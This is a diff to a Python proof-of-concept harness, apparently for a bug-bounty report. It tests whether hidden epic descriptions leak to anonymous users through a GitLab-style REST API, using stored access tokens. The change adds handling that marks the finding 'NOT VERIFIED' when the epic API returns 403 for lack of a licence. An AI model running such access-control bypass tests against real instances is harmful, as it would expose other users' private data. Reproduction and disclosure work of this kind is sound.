@@ -21,11 +21,17 @@ TOKENS = os.environ.get("TOKEN_DIR", ".")
 os.makedirs(EVIDENCE, exist_ok=True)
 records = []
 errors = []
+verdict = "INCOMPLETE"
+blocker = None
 marker = "H1LIVE-" + secrets.token_hex(6)
 
 def token(label):
     with open(os.path.join(TOKENS, label + ".pat"), encoding="utf-8") as fh:
         return fh.read().strip().splitlines()[-1]
+
+class FeatureBlocked(Exception):
+    """The real API rejected prerequisites; no exploit claim is possible."""
+
 
 def record_http(method, path, role="anonymous", payload=None):
     url = BASE + "/api/v4" + path
@@ -78,7 +84,9 @@ def persist():
     with open(os.path.join(EVIDENCE, "summary.json"), "w", encoding="utf-8") as fh:
         json.dump({"marker": marker, "errors": errors, "steps": len(records),
                    "live_http": True, "database_link_insertion": False,
-                   "licensing_stubs": False}, fh, indent=2)
+                   "licensing_stubs": False,
+                   "verdict": verdict,
+                   "blocker": blocker}, fh, indent=2)
 
 try:
     version = must(record_http("GET", "/version", "root"), [200], "instance version")
@@ -106,9 +114,21 @@ try:
         "user_id": authorid, "access_level": 40,
     }), [201], "add author as group member")
 
-    source = must(record_http("POST", f"/groups/{gid}/epics", "owner", {
+    source_resp = record_http("POST", f"/groups/{gid}/epics", "owner", {
         "title": marker + "-VISIBLE-SOURCE", "description": "Visible test epic",
-    }), [201], "create source epic")
+    })
+    if source_resp[0] == 403:
+        # The disposable EE installation has no Ultimate subscription.
+        # 403 is not a valid bypass PoC; record the legitimate feature gate.
+        license_status, _ = record_http("GET", "/license", "root")
+        blocker = {
+            "type": "EPIC_CREATION_DENIED",
+            "epic_http_status": 403,
+            "license_api_status": license_status,
+            "reason": "Real Epic API denied prerequisite. Without an appropriate license or permission no live exploit test is possible.",
+        }
+        raise FeatureBlocked("Epic API returned 403. Live test blocked by entitlement/permissions; security finding NOT VERIFIED.")
+    source = must(source_resp, [201], "create source epic")
     target1 = must(record_http("POST", f"/groups/{gid}/epics", "author", {
         "title": marker + "-HIDDEN-TARGET-ONE",
         "description": marker + "-SECRET-DESCRIPTION-ONE",
@@ -153,8 +173,13 @@ try:
     print("POST_BAN_NEW_LINK_STATUS:", attempt[0], flush=True)
     if not leaked:
         raise RuntimeError("No hidden Epic description leaked through anonymous HTTP GET")
+    verdict = "LIVE_HTTP_DISCLOSURE_REPRODUCED"
+except FeatureBlocked as exc:
+    verdict = "BLOCKED_BY_EPIC_HTTP_403"
+    print("NOT VERIFIED:", exc, file=sys.stderr, flush=True)
 except Exception as exc:
     errors.append(str(exc))
+    verdict = "FAILED_OR_NOT_REPRODUCED"
     print("NOT VERIFIED:", exc, file=sys.stderr, flush=True)
 finally:
     persist()
